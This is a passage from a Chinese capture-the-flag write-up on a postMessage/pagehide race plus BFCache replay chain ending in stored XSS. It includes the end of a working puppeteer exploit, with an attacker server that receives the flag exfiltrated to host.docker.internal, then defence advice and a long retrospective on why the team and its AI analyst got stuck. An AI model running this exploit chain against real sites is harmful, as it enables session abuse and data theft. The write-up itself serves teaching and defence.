  if (ph === "evict") {
    if (nn < 8) setTimeout(()=>{ location.href = location.pathname+"?ph=evict&nn="+(nn+1); }, 120);
    else        setTimeout(()=>{ history.go(-10); }, 200);   // ③ 回放 check（网络重发）
  } else {
    setTimeout(()=>{ location.href = location.pathname+"?ph=evict&nn=1"; }, 3500); // 3.5s=给弹窗竞态留完成时间
  }
</` + `script></body>`;

// ── 攻击者服务器：一个极简的网站，总共只有三个页面 ────────────
// 它跑在宿主机 9975 端口（不在容器里），容器里的挑战通过
// host.docker.internal:9975 来访问。三个页面的分工：
//   /stage1 = 机器人流程的④打开的入口页（攻击指挥部，编排左右两路）
//   /s2p.js = 弹窗里 /sandbox 页加载的攻击脚本（= 第六章那两行 payload）
//   /f      = XSS 外传的收件箱（flag 到达时打印到终端，攻击闭环）
http.createServer((req, res) => {
  const u = new URL(req.url, "http://x");
  // 收 flag：XSS 代码带着 flag 跳转到这里，flag 拼在网址 ?后面，打印即完成
  if (u.pathname === "/f")      { console.log("\n[FLAG]", u.search.slice(1)); res.writeHead(200); return res.end(); }
  // 发 S2 脚本（Content-Type 声明为 JS，浏览器才会当脚本执行）
  if (u.pathname === "/s2p.js") { res.writeHead(200, {"Content-Type":"application/javascript"}); return res.end(S2); }
  // 发 stage1 页
  if (u.pathname === "/stage1") { res.writeHead(200, {"Content-Type":"text/html"}); return res.end(STAGE1); }
  res.writeHead(404); res.end();
}).listen(PORT, async () => {
  // ── 驾驶机器人：用 puppeteer 模拟 2.2 节 bot.js 的完整流程 ──────
  // （正式环境里这部分由题目的机器人完成；本地复刻没有它，我们自己扮演）
  const browser = await puppeteer.launch({ headless: "new", args: ["--no-sandbox"] });
  const p = await browser.newPage();
  await p.setExtraHTTPHeaders({ "X-Bot-Token": "local-bot-token" }); // 带上机器人口令
  await p.goto(CHAL + "/reports/session");   // 换取 admin 会话 Cookie（之后浏览器所有请求自动携带）
  await p.setExtraHTTPHeaders({});           // 口令只用这一次，用完摘掉
  // p.evaluate(函数) = 让浏览器页面里执行这段函数并取回结果（下面创建笔记、提交报告都用它）
  const note = await p.evaluate(async (chal, payload) => {   // 创建 XSS 笔记
    const r = await fetch(chal + "/create", { method: "POST",
      headers: {"Content-Type": "application/x-www-form-urlencoded"},
      body: "title=p&html=" + encodeURIComponent(payload) });
    return new URL(r.url).pathname.split("/note/")[1];
  }, CHAL, XSS_NOTE);
  const st = await p.evaluate(async (chal, url) => {         // 提交 report
    const r = await fetch(chal + "/report", { method: "POST",
      headers: {"Content-Type": "application/x-www-form-urlencoded"},
      body: "url=" + encodeURIComponent(url) });
    return r.status;
  }, CHAL, `http://host.docker.internal:${PORT}/stage1?note=` + note);
  console.log("[report]", st, "— 机器人执行中（弹窗竞态 + 挤出链，约 15s）...");
  await new Promise(r => setTimeout(r, 16000));
  await browser.close(); process.exit(0);
});
```

```text
[check-debug] 2nd-visit note=true policy=true stateOK=true prepared=true approved=true used=false
```
**★ 第二颗星（挤出链成功的铁证）**：check 被第二次访问，服务器打出全字段——`policy=true` 说明这次请求带着 Sec-Fetch-Site: none 头（BFCache 挤出 + 历史回放成功），`approved=true` 就是上一颗星设置的值，九个条件全部满足——服务器随即渲染 XSS 页面。

**③ 攻击者服务器的输出（回到第一个终端）**：

```text
[FLAG] {"flag":"pwnsec{real_flag_on_remote"}"}
```
**★ 第三颗星**：预埋在笔记里的 XSS 代码在挑战域执行了——它读到 flag 后跳转到攻击者服务器，flag 出现在网址参数里被打印出来。拿它和 docker-compose.yml 里的 `FLAG=` 值核对：一字不差，攻击链闭环。

三颗星连成一线：**竞态置 approved → 历史回放过 policy → XSS 读 flag**。缺任何一颗星的排查入口：

- 缺第一颗（无 APPROVED SET）：第六章的竞态没跑成——先看有没有 `[sandbox-debug]` 行（没有说明弹窗/沙箱链路就没走通，查 docker 网络和 u 参数编码）、有则查 pagehide 消息是否发出（需要加 console 转发）。
- 缺第二颗（2nd-visit 的 policy=false）：挤出链没走成——查历史栈深度（跳的次数够不够挤出）、查 BFCache 状态。对应第四章。
- 缺第三颗（无 [FLAG]）：XSS 没执行——查 note 是否创建成功（XSS 笔记的 128 字节限制有没有超）、查外传地址是否可达（host.docker.internal 从容器方向能不能访问宿主机）。

> 远程真实实例的对应输出即 flag `pwnsec{917872750f693769}`（来源：外部 writeup 作者对真实实例的两次成功运行；本队在比赛结束、实例下线后才获得该值，本地以占位值完成了全链验证）。

## 第八章：如何防御

这道题的攻击链踩了四个独立的坑，每个坑对应一条可落地的修复：

**漏洞一：消息校验只看"寄件窗口是谁"，不看消息内容本身。** pagehide 竞态之所以能得手，就是因为"寄件窗口身份"会随文档切换而对不上——身份校验形同虚设。修复方向：改为校验 `e.origin`（寄件人来自哪个网站——这个值不会因文档切换而变），再让消息体自带一次性暗号（暗号由服务器用密钥对 nonce 加密签名生成，攻击者伪造不了）。更彻底的做法：干脆不要用浏览器侧的任何信号做授权决策。

**漏洞二：打开 approved 开关只凭"review 页面发了一次请求"这一个信号。** 只要能让 review 发出一次 /complete，服务器就直接翻转授权状态——太轻信了。修复方向：服务器多做一层验证，只接受"页面内部代码发出的请求"（浏览器会在这类请求上盖 `Sec-Fetch-Dest: empty` 章，而导航产生的请求盖的是 document 章——据此区分），或者要求每次请求附带一次性编号。

**漏洞三：一次性暗号 URL 可被历史回放。** BFCache 挤出后 `history.go()` 让带 nonce 的 check 请求原样重发，更糟的是"历史导航"恰恰是服务器要求的特征（Sec-Fetch-Site: none），想据此刻意拒绝都不行。修复方向：给 check 响应加 `Cache-Control: no-store`（禁止任何缓存）；或者把 nonce 与首次访问的时间戳绑定，晚到的重放直接失效；或者像取号机一样——"检查"与"标记已用"必须一次原子完成，第二次必然扑空。

**漏洞四：用户存的笔记最终在没有任何安全限制的页面里原样渲染。** 128 字节的笔记就足够完成"读 flag + 送出"。修复方向：渲染前先净化（只保留白名单里的无害标签），或者给那个页面加 CSP（`script-src 'none'` = 完全禁止脚本，再限制 fetch 只能发往本站）。

纵深防御角度值得展开的一点：单看每道防线都很强——沙箱（1.2 讲的没收身份证）、COOP（1.3 讲的折断弹窗遥控器）、Trusted Types（5.2 的禁止字符串当代码）、CSP（禁止加载外部框架）都是业界标准强度，攻击者 140 次失败就是证据。**但防线之间有一条没人看守的缝：approved 这个开关把"浏览器内部的事件先后顺序"当成了授权依据**——"先收到消息、后换文档"和"先换文档、后收到消息"在服务器看来完全不同，而浏览器恰恰允许攻击者操纵这个先后（pagehide 就是官方提供的"两件事之间"的接口）。设计者只考虑了"消息是否合法"，没考虑"消息与文档切换的相对时序也可被操纵"。这就是所有竞态攻击的共同模式：单个组件都安全，组件之间的事件顺序成了新的攻击面。教训一句话：**任何依赖客户端事件顺序的安全决策，最终都要面对竞态攻击——因为"顺序"本身就是攻击者可以介入的维度。**

## 第九章：我们为什么没能独立攻破——完整反思与根治方案

> 这一章是写给"未来的我们"和所有卡在同类问题上的分析者。攻击链怎么打通的，前面八章已经讲完；这一章回答另一个同样重要的问题：**为什么 140 个实验、几十个小时，都没能独立找到那两行 pagehide payload？卡点到底在什么地方？下次遇到同类题，用什么办法保证能找到？**
>
> 如果你只读一章，建议读这章——技术会过时，"为什么会卡住"的教训不会。

### 9.1 根因分层：卡点不是一个，是六层

5.7 讲了"时序盲区"这个表象。把它当洋葱一层层剥开——先剥出人类分析师会犯的四层（第 0~4 层），再继续往下，还有一层只有"AI 作为主力分析者"时才存在的结构性放大器（第 -1 层）。**每一层单独看都不致命，六层叠加才造成了"在正确答案门口得出死锁结论"。** 建议从第 -1 层（最深）往下读，看表层如何被深层决定。

**第 -1 层（最深）：AI 特有的结构性弱点。**
先说明为什么编号是 -1：下面第 0~4 层是人类分析师也会犯的通用错误（各层名字先混个脸熟，马上逐层展开：实验同质化 = 所有实验长得都一样、规范外推 = 把标准文档的话过度引申、框定错误 = 思考范围圈错了、穷举惯性 = 反复试同类变体停不下来）。但本题的特殊之处：**主力分析者是一个 AI**——它带着三个人类没有（或较轻）的放大器，把上面每一层的错误效果都放大了数倍。编号 -1 表示它在所有层之下、驱动所有层：

1. **上下文定势固化**——AI 没有遗忘机制。人类分析师卡了几小时后可以睡一觉、换个心境、第二天从零再看题目（睡眠会重组记忆、削弱前一晚的执念）；AI 的全部推理共享同一条上下文，早期的错误结论（本题中是"WindowProxy 恒等 → 此路死锁"）写进去之后，**之后每一次推理读到它都会被它锚定**——越往后，对话里这个结论被"证实"的次数越多（每次失败实验都被解读为又一次支持），锚定越深。具体到本题：死锁结论形成后的第 10 小时和第 30 小时，我们的"再想想"产出的实质是同一个方向的第 N 次变体——形式在变、框架从未变过。
2. **知识激活的词汇依赖**——AI 的已有知识（训练时学到的）要靠上下文里出现相关词才能被调用。本题全程上下文里反复出现的是 e.source / iframe / popup / COOP——每个词激活的都是"换发送者"方向的知识库；而 "pagehide" 这个词**从未在任何一轮分析中出现过**（上下文里没有 → 相关知识从未被调用 → 等价于"不知道"）。人类的联想可以跨域触发（洗澡时突然想起上周读过的文章），AI 的激活严格跟着眼前的文字走。这解释了一个反常现象：我们"知道" pagehide（模型训练语料里肯定有），却三十小时想不起它——不是知识缺失，是词汇通道从未打开。
3. **对"高输出动作"的结构性偏好**——跑一个 curl 或 node 实验几秒出结果、结果填进上下文、产生"有进展"的实感；坐下来画时刻表、拆零件、做纯思考则**没有任何输出物**——工作流里"思考"环节的产出不可见，天然被"实验"环节挤压。具体到本题：30 小时里跑了 140 个实验（每个都有结果可报告），画表/拆解/出题人反推的次数是 **0**——不是没想到要做，是"做实验"总排在"做思考"前面，而思考永远排不上。

**第 0 层：分类错误——发生在看代码的头几秒。**
看到 `if (!closing || e.source === viewer.contentWindow) return` 的瞬间，大脑自动完成了"认题"："这是**验证消息来源**的题，见过！这类题的套路是：换个身份发 / 绕过身份检查 / 销毁发送方。" 认题过程快到几秒、且完全在意识之外——你不会记得"我刚刚做了个分类判断"，只会记得"我开始解题了"。但这次认错了：它长得像"来源校验"题，实际是"**异步比较竞态**"题（比的是消息寄出和读取两个时刻之间发生了什么）。认错题型的后果是**整个解法库都调错了**——之后 30 小时、140 个实验全部在"换发送者"的解法空间里穷举，pagehide 连这个空间的边界都摸不到。而第 -1 层的"定势固化"保证了这个最初的错误分类在几十个小时里从未被重新质疑——每次实验失败都被解读为"这个变体不行"而不是"这个方向可能本身错了"。

**第一层（表象层）：实验设计的同质化。**
所有 140 个实验共用同一个隐含设定——"消息在 S2 存活期间发出并立即处理"。没有一个实验测过"消息发出后、处理前，中间发生了文档切换"。用实验设计的术语说（"自变量"指实验里你主动控制的那个条件）：我们只变化了"**谁**发消息"这一个自变量（弹窗？子框架？别的域？），从未变化过"**何时**发消息"这个正交自变量。

**第二层（方法层）：把"规范结论"当成了"封闭结论"。**
我们援引了规范：iframe 的 WindowProxy 跨导航身份恒等——这是对的。但规范描述的是**对象身份**的稳定性，完全没有说"消息队列里排队中的消息，其 e.source 快照与新文档的 contentWindow 仍然相等"。我们从一条正确的规范陈述，外推出了一条错误的封闭结论（"任何时候发都被过滤"）。**外推的那一步没有任何实验支撑，但它披着规范的外衣，我们自己没有察觉。**

**第三层（思维层）：问题框定错误。**（"框定"= 你给问题划定的思考范围——它决定了你能想到哪些答案；范围划错，正确答案就永远在圈外）复盘我们发现，从一开始就把问题框定成了：

> ❌ 错误框定："如何让**另一个窗口**给 review 发消息？"（于是去穷举弹窗几何、子框架、COOP 绕过……）

而正确的问题应该是：

> ✅ 正确框定："如何让 **e.source 与 contentWindow 不相等**？"（比较的两边各自在什么条件下取什么值——顺着这个问题走，"文档切换会让两边指向不同对象"几乎是必然被问出来的）

这两个框定的差别是**空间维 vs 时间维**：错误框定里只存在"谁发"这一种变量，pagehide 根本不在它的解空间里——**当你在解决一个错误框定的问题时，实验做得越多、越严谨，反而离正确答案越远，因为每个实验都在给错误的框架添砖加瓦。** 这解释了一个反直觉的事实：为什么投入最多实验量的方向（弹窗几何，30 次）恰恰是离答案最远的方向。（第 0 层与第三层的区别：第 0 层是几秒内发生的自动分类，第三层是分类后持续几十小时的主动框定——前者是病根，后者是病灶。）

**第四层（流程层）：卡壳后的行为模式劣化。**
时间线回放：前三个小时我们还在提出新机制假设（"试试 BCG 的行为""试试 COOP 会不会有豁免"）；第三个小时之后，事实上再没有提出过任何**新机制**的假设，全部转入已有方向的变体穷举——弹窗方向做到第 20 个变体、COOP 绕过做到第 15 个。为什么明知收益在降还停不下来？两个心理机制：穷举每轮都有产出（"这种写法也不行"也是一条结论），维持着"在前进"的体感；而提出全新假设（"消息会不会跨文档投递？"这种从零开始的念头）风险高——可能想十分钟就否定自己——且没有任何即时产出。比赛压力之下，大脑自动选了"体感前进"。**最讽刺的是：第 5 个变体之后的 15 个变体几乎零信息增益——那段时间的真实作用只是推迟承认方向错了。** 我们始终没有意识到自己已经从"探索"退化成了"扫尾"。

**还有一个独立缺失：出题人视角推理。**
这一条不在六层洋葱的任何一层里——它是一个完全缺席的推理通道。CTF 题不是自然存在的漏洞，是作者**精心构造**的谜题：每行防线都是作者写的、每个设计选择都是刻意的。**代码的写法本身就是提示**——但前提是你去读它。举本题两处：

- 作者用了 `e.source === viewer.contentWindow`（窗口身份比较），而不是更常见的 `e.origin`（来源域比较）。这个反常选择的含义：漏洞必然藏在"窗口身份**会变**"这件事上——用 origin 检查的话，pagehide 竞态根本骗不过它（origin 不会因文档切换而变），题目就不成立了。**作者选择这个写法，等于亲口告诉你钥匙跟"身份的可变性"有关。**
- 作者写了 closing 开关 + viewer.src=end 换页这套看起来多余的时序装置。"审查一次"的功能完全不需要这么绕——**复杂装置的存在本身就是"答案在时序里"的呐喊。**

我们全程只问"这道防御怎么绕"，从未问"作者为什么造成这样而不是更简单的样子"。事后看，出题人反推的两个答案——身份可变、时序装置——指向同一个方向：pagehide。

### 9.2 可检验的复盘：五个"如果当时"

反思不能停留在"当时没想到"——那既无法检验（怎么证明想到了就会成功？），也没法改进。下面五条"假如当时"推演（术语叫反事实命题：假设过去某个环节不同，推演结果会怎样变），每一条都具体到"如果在哪个实验里做了什么动作，就能在多少分钟内发现答案"——可检验、可复制。它们是 9.3 八项工具的直接来源：

**假如当时之一：在验证实验里同时放一组"快死时发"的对照。** 我们的实验只安排了"页面活着时高频发消息"一组。如果在同一个脚本里并排放两组（活着时发 / 快死时发），10 分钟内就会看到快死那组的比较结果翻转——当场破题。没想到的原因：实验目标定成了"验证恒等"，于是只设计了能验证恒等的实验——"全部通过"反而成了错误结论的佐证。（换角度对照 = 9.3 工具二的正式说法。）

**假如当时之二：把"一条消息从寄出到被读取"的全过程画成时间线。** 时间线上每个节点（寄出→排队→排队期间可能发生的页面事件→被处理）一旦画出来，自然会问出"如果排队期间换了文档，两边的取值还相同吗"。没想到的原因：我们画过窗口关系图（哪些窗口连哪些窗口），从没画过**单条消息自己的一生**。

**假如当时之三：卡壳后的检索词里包含时机类词汇**（pagehide / unload / "message delivered after navigation"）。这些词会直接命中安全研究者 terjanq 和 Jorian Woltjer 公开过的同类案例。没想到的原因：我们的检索词全是"谁发的"类词汇（popup / COOP / iframe / e.source bypass）——**用被卡住的那个问题自己的语言去检索，永远检不到答案**，因为答案在另一个问题的语言里。

**假如当时之四：把否定结论写成"在某某条件下不成立"，而不是光秃秃的"不成立"。** 只要写下"仅在页面存活期间发出并处理的前提下恒等"这个边界，"pagehide 时刻发送"就是边界外最显眼的未测条件。没想到的原因：记笔记的习惯里没有"必须写适用条件"这一条。

**假如当时之五：卡壳满 2 小时，强制执行一次"换问题"仪式。** 仪式的操作：在纸上写下一句固定格式的话——"我一直问的是 X 问题；如果真正该问的是 Y 问题，Y 最可能是什么？列出三个候选。" 然后逐个想：每个候选至少写一句话说明"如果它是真问题，答案大概长什么样"。对本题执行这个仪式，30 分钟内就会写下"X = 谁发消息；候选 Y：① 何时发 ② 接收方在什么状态 ③ 消息从寄出到被读中间经历了什么"——候选①就是正确方向。没想到的原因：没有任何流程逼我们在卡壳时做这个动作，全指望"灵感自己来"——而灵感与压力成反比、与疲劳成反比，比赛正是一边高压一边疲劳的场景，灵感最不可能来的时候恰恰是最需要它的时候。

注意这五条的共性：**每一条都是当时"差一步"就能做到的具体动作，而不是"水平不够"**。这正说明卡点是方法论问题，可以用制度根治——这正是 9.3 的内容。

### 9.3 根治方案：八项强制工具（"制度级"的意思是：做成必须执行的硬规则，而不是"下次小心"的自觉提醒）

"下次要多想全面"这种话没法执行。下面八项工具，每一项都按同一个格式写：**先讲本题里真实发生的故事 → 解释为什么会掉进这个坑 → 给一条一句话规则 → 手把手教怎么做 → 说明为什么这样做就防得住**。防不住的那一格，9.4 会诚实交代。

#### 工具一：求值时刻表——先搞清楚"比较的两边各是什么时候取的值"

**【当时发生了什么】** 我们做了这样一个实验：让沙箱里的脚本每隔 1 毫秒发一条消息，一共发了 80 条，观察防线代码 `if (e.source === viewer.contentWindow)` 的反应。80 条全部被拦截（比较结果都是"相等"）。于是我们记下结论：同一个 iframe 里发的消息，永远会被过滤掉。

**【为什么会掉坑】** 这行 `if` 看起来是一个瞬间完成的比较，其实它的两边根本不是同一时刻取值的：
- `e.source` 是消息的"寄件人地址"——在**寄出那一刻**就抄写在信封上，之后永远不变；
- `viewer.contentWindow` 是**每次读信时现场去查**"这个 iframe 里现在装的是谁"。

我们的 80 条消息全都是"寄出后立刻被处理"——寄和读之间没发生任何事，所以两边总是查到同一个窗口，比较永远"相等"。**但我们没意识到：寄信和读信之间是"可以发生事情的"——比如 iframe 里换了一个文档。一旦中间换了文档，寄件地址（旧文档）和现场查到的（新文档）就不同了。**

**【规则】** 看到任何写在事件处理函数里的比较/校验代码，先别分析怎么绕过——先画一张表，回答三个问题：每个值是什么时候定的？每个值是什么时候查的？**这两个时刻之间可能发生什么事件？** 画不出这张表，不许下结论。

**【怎么做】** 拿本题的防线画给你看：

| 代码里的值 | 它是什么时候取的 |
|---|---|
| `e.source` | 消息寄出那一刻定死（快照），之后不变 |
| `viewer.contentWindow` | 每次处理消息时现场重查 |

两个时刻之间可能发生的事件（任何一件都会让两边对不上）：① iframe 里的文档被换掉 ② iframe 被从页面里删掉 ③ 窗口被关闭。

**【为什么能防住】** 第三列一旦列出来，"文档被换掉"就白纸黑字躺在那儿——下一句自然的问题是"有没有消息恰好跨越换文档的时刻？"而这个问题直接通向答案（pagehide 正是"换文档前最后一刻"的钩子）。这张表 30 秒画完，替我们省了几十个小时。

画表心法补充：**第三列"两个时刻之间可能发生什么"是全表的灵魂，也是最难填的一列**——因为它问的不是代码里写了什么，而是代码之外浏览器还会做什么。填法：把"这个页面/元素可能经历的所有事件"过一遍——加载、换页、被删除、窗口关闭、标签页隐藏——每个问一句"它会改变比较的某一边吗？"改变了就写进去。这一列的填空过程，就是在系统性地枚举你原本想不到的攻击面。

#### 工具二：对照组规则——下"不行"的结论前，必须换一个没试过的角度

**【当时发生了什么】** 我们围绕这道防线做了 140 多个实验：换弹窗、开子框架、伪造各种窗口关系……全部失败。实验越多，我们越确信"从 iframe 里发消息这条路是死的"。

**【为什么会掉坑】** 140 个实验听起来很多，其实它们**只算一种实验**：全都在"页面活着的时候"把消息发出去、立刻被处理。打个比方：锁孔其实有两个旋转方向，我们设计了 140 把造型各异的钥匙，但**全都在往同一个方向拧**——每一次失败都在证明"这个方向拧不开"，我们从没拧过另一个方向。实验数量给了我们虚假的自信：**140 次一致的失败，只能证明"这一种做法不行"，证明不了"都不行"。**

**【规则】** 任何实验如果要得出"此路不通"的结论，必须在同一批实验里包含至少一个**换了个角度的对照组**。检查方法很土但有效——问自己一句话："这批实验里，我改动的条件是什么？题目里还有哪些条件我一次都没改过？"

**【怎么做】** 本题的正确实验应该长这样——一个脚本里并排放三组：

```javascript
// A 组（我们做了的）：页面活着时，高频发
setInterval(() => top.postMessage({a:1}, "*"), 1);
// B 组（当时没做的）：页面即将被销毁时，发 —— pagehide 是"页面死前最后一刻"的通知
addEventListener("pagehide", () => top.postMessage({b:1}, "*"));
// C 组（对照组）：什么都不发，确认没有别的干扰（万一 A 组的失败另有原因——比如脚本根本没跑起来——C 组能暴露出来）
```

三组的**预期结果对照表**（实验前先写下预期、实验后对比，这是对照组方法的完整闭环）：

| 组 | 当时我们的预期 | 实际会看到 | 预期对了没 |
|---|---|---|---|
| A | 被过滤 | 被过滤（eq=true） | 对了 |
| B | （没测，想当然认为也一样被过滤） | **防线放行（eq=false）** | 想当然错了——这一行就是答案 |
| C | 无消息 | 无消息 | 对了 |

**【为什么能防住】** 三组并排跑一次（10 分钟写完），B 组的消息会显示出"比较结果不相等、防线放行"——A 组的 80 次失败和 B 组的 1 次成功放在同一屏里，谁也骗不了谁。对照组的精髓不在"多跑几个实验"，而在**让不同条件的实验结果互相可见**——单独跑 A 组一百次，也看不出"B 组和 A 组不一样"。

#### 工具三：给"不行"写上适用条件——防止半瓶结论变真理

**【当时发生了什么】** 实验失败后，我们在笔记和知识库里记下的话是："viewer 内发出的 postMessage 永远被 e.source 过滤（WindowProxy 身份恒等）。"

**【为什么会掉坑】** 这句话里最毒的是"永远"两个字。我们的实验只验证了"页面活着时发→被过滤"这一种情形，但笔记里没写这个前提。几个小时后回看笔记的人（包括我们自己）只会看到一条斩钉截铁的"永远不行"——它披着实验结论的外衣，实际上是一句超出了验证范围的话。**错误结论就是这么固化的：每一条都来自真实的实验，只是范围被悄悄放大了。**

**【规则】** 记录任何否定结论（"X 不行"）时，禁止只写这一句。必须写全三段：**在什么条件下不行（哪个实验验证的）+ 什么条件还没试过。**

**【怎么做】** 同一条结论，两种写法对比：

```text
❌ 我们当时写的：
   "viewer 内发出的 postMessage 永远被过滤"

✅ 应该写的：
   "在【页面存活期间发出并立刻处理】的条件下被过滤
    （验证于 t_winid 实验：80 条消息全部被拦）
    还没试过：消息发出后、处理前，iframe 换了文档的情形"
```

**【为什么能防住】** 两个层面。第一层（防自欺）："永远不行"四个字一旦被强迫加上限定条件，验证范围的边界就显形了——你能清楚看到"这个结论只覆盖了 X 条件"，而边界外的一切都是空白。第二层（供检索）：**"还没试过"那一栏写出来，它就是下一步实验的待办清单**——本题的那一栏会白纸黑字写着"换文档的情形"，而 pagehide 是实现它的第一个候选。三段式的妙处在于它是**自我完善**的：每次实验完成，"还没试过"栏少一行、条件栏多一行——知识库里的结论越来越精确，而不是越来越笼统。

#### 工具四：换词搜索——卡住之后，禁止再用旧问题的词汇去找新答案

**【当时发生了什么】** 分析中途我们做过大量外部检索，用的关键词是：`e.source bypass`、`iframe popup COOP bypass`、`postMessage cross-origin trick`……几十次检索一无所获。

**【为什么会掉坑】** 这些搜索词有一个共同点：它们全都在描述"**谁**发的消息"这个问题（弹窗、跨域、iframe——都是"换一个发送者"的词汇）。而答案在另一个问题里："**什么时候**发"。用第一个问题的词去搜，搜一百次也搜不到第二个问题的答案——就像在"红色物品"抽屉里反复翻找，而钥匙在"圆形物品"抽屉里。**我们不是没搜索，是用被卡住的那个问题自己的语言去搜索。**

**【规则】** 卡住超过 1 小时后，禁止再用当前问题陈述里的任何词去搜索。强制做一个机械动作：把问题拆成三类——**涉及什么东西（对象）/ 发生在什么时机（时机）/ 靠什么原理起作用（机制）**——每一类独立想 3~5 个词，然后跨类组合着搜。

**【怎么做】** 拿本题演示：

```text
当时实际搜的（全是"对象"类的词）：        矩阵拆解后应该搜的：
  e.source bypass                         对象类：postMessage / e.source / contentWindow
  popup COOP bypass                       时机类：pagehide / unload / beforeunload /
  iframe postMessage trick                        "before navigation" / lifecycle
                                          机制类："delivered after navigation" /
                                                 "message across document swap"
跨类组合（当时一次都没搜过）：
  postMessage + pagehide        ← 这个组合直接命中本题的解法原型
  e.source + after navigation   ← 命中 terjanq 公开过的同类案例（见 5.3 的前置知识）
```

**【为什么能防住】** 搜索引擎只会回答"问得出来的问题"。矩阵拆解强制让"时机类""机制类"的词也有机会被生成——词一出来，答案就出来了。

具体执行细节（第一次做会觉得别扭，做两次就成习惯）：

1. 找张纸（或开个空白文件），画三栏，分别写上"对象 / 时机 / 机制"。
2. 对象栏：这道题里有哪些"东西"？（本题：postMessage、e.source、contentWindow、viewer、消息……）把每个都写下来，哪怕是看起来"明显"的。
3. 时机栏：从头到尾有哪些"时刻"？（本题：页面加载时、viewer 加载完成时、页面快死时、换页后、消息排队时……）**这一栏是最容易空白的——因为被卡住的问题陈述里通常根本不含时机词汇，你要逼自己凭空想**。想不出来的话，把页面的"一生"从头到尾走一遍：出生（加载）→ 干活（收消息/发消息）→ 死亡（被替换/关闭），每个阶段都是时机词。
4. 机制栏：这题靠什么原理运转？（本题：消息怎么从 A 窗口到 B 窗口、浏览器怎么决定谁是谁……）用"XX 怎么 YY"的句式造词。
5. 跨栏各挑一个词组合成搜索词，每个组合搜一次。本题的致命组合是"postMessage + pagehide"——两个词分别来自对象栏和时机栏，当时任何一栏单独的词我们都搜过，但从未组合过。


#### 工具五：连败熔断——防止在同一个坑里越挖越深

**【当时发生了什么】** 弹窗方向：第一个方案失败，改一个参数再试，又失败，再改……到第 15 个变体时我们还在做第 16 个。COOP 绕过方向同理做到第 20 个。每个变体都有"新结论"产出（"这种写法也不行"），感觉一直在前进。

**【为什么会掉坑】** 两个心理机制在起作用：①做变体有**进展感**——每次实验都产出一条结论，哪怕结论只是"又排除了一个"；②换方向有**失败感**——等于承认前面十几次实验白做了。比赛的压力让人选进展感、回避失败感。结果是：我们花在错误方向上的实验越多，就越舍不得离开它。**从第 5 个变体到第 20 个变体的投入，几乎零产出——那段时间的真正作用只是推迟承认方向错了。**

**【规则】** 同一个方向的连续失败达到 **5 次**，强制停机：接下来 30 分钟不许做任何实验，只做一件事——回答书面问题："我一直假设关键是【____】这个方面。如果关键其实是别的方面，最可能是什么？列出 3 个候选方面，给每个设计一个 10 分钟就能做的小实验。"

**【怎么做】** 熔断的完整流程（不只是"停下"）：

1. **停**：第 5 次失败出现的瞬间，关掉所有实验——不许"再试最后一个变体"（那就是第 6 次）。
2. **写**：拿出纸笔回答固定三问——我假设的关键方面是什么？如果关键在别的方面，最可能是哪三个？每个候选设计一个 10 分钟小实验（不是 10 小时——就是"两组并排跑一次"的量级）。
3. **选**：三个候选里挑"最便宜的实验"先做。
4. **比**：把候选实验的结果与原方向的 5 次失败放在一起看——如果候选实验 10 分钟就出现新信号，证明熔断值了；如果三个候选全落空，说明问题可能在更深的层（回到工具六重新拆零件）。

本题如果在弹窗方向第 5 次失败后执行熔断，第 2 步会写下：

```text
我一直假设：关键是"谁发消息"（发送者身份）。
3 个候选替代方面：
  1. 发送时机——什么时候发（页面活着/快死了/别的时间点？）
  2. 接收方状态——review 页面自己在什么状态下（closing 前后？）
  3. 消息排队机制——消息从发出到被处理中间经过什么？
10 分钟实验：把"快死的时候发"（pagehide）和"活着的时候发"并排测一次。
```

**【为什么能防住】** 候选 1 的 10 分钟实验就是答案本身。熔断的价值不是"停下来休息"，是**用制度强制产生候选 1**——"灵感"是等不来的：压力之下，大脑的默认流向是"再做一次已知操作"（变体穷举），而"想一个全新方向"需要放松和安全感——比赛恰恰不给这两个条件。所以靠自觉等于靠运气，只有"第 5 次失败 = 必须停 30 分钟"这样的硬规则，才能在灵感最不可能来的时候**强行制造产生灵感的条件**。

#### 工具六：拆零件，再归类——防止第一眼就认错题型

**【当时发生了什么】** 看到防线代码 `if (!closing || e.source === viewer.contentWindow) return` 的头几秒，脑子里"咔哒"一声完成了认题："这是**验证消息来源**的题，我见过！这类题的套路是：换个身份发 / 绕过身份检查 / 销毁发送方。" 接下来 30 多个小时，140 个实验全部跑在这三类套路里。

**【为什么会掉坑】** 人（和 AI）见到新问题的第一反应是"这像我见过的哪类题"——一旦"认出来"，就直接调那类题的解法库，**不再回头检查认没认对**。这个过程快到几秒钟、且完全在意识之外，所以错了也不自知。本题的真相是：它长得像"验证来源"题，实际是"**时序竞态**"题（比的是消息寄出和读取之间有没有发生文档更换）。认错题型 → 调错解法库 → 后面 140 个实验全在打一个不存在的靶子。这是所有层里发生最早、代价最大的一层。

**【规则】** 看到任何防御代码，**头 10 秒内禁止归类**（禁止说/想"这是 XX 类题"）。必须先完成一个机械动作——把代码拆成零件，逐个问"这个零件会变吗？什么让它变？"——拆完之后，题型会自己浮出来，那时再归类。

**【怎么做】** 拿本题的防线，拆给你看（整个过程约 1 分钟）：

```text
防线：if (!closing || e.source === viewer.contentWindow) return;
      （翻译：开关没打开，或者寄件人就是自家人 → 退回）

零件 1：closing（一个开关变量）
   谁改它？→ viewer 的 load 事件。什么时候触发？→ 页面加载完成时。
   → 这个零件跟【时间点】绑定！

零件 2：e.source（消息上的寄件人地址）
   什么时候定死？→ 寄出那一刻。寄出时机不同，它一样吗？
   → 这个零件跟【寄出时机】绑定！

零件 3：viewer.contentWindow（现场查"iframe 里现在是谁"）
   什么会让它查到不同的结果？→ iframe 里的文档被换掉的时候。
   → 这个零件跟【文档更换】绑定！

拆完一看：三个零件全部跟"时间/时机"有关，没有一个跟"发送者身份"有关。
→ 归类：时序题（不是来源验证题）。此后所有实验围绕时序展开。

这个拆法和"认题型"的根本区别用一张对比收束：
· 认题型：看到 e.source → "来源校验题" → 调解法库（换发送者/绕检查/毁发送方）→ 打错靶
· 拆零件：零件1 跟时间绑 → 零件2 跟时间绑 → 零件3 跟时间绑 → "时序题" → 事实推出方向
认题型问的是"这像我见过的什么"，拆零件问的是"代码里实际写了什么"——前者可能认错，后者不会。
```

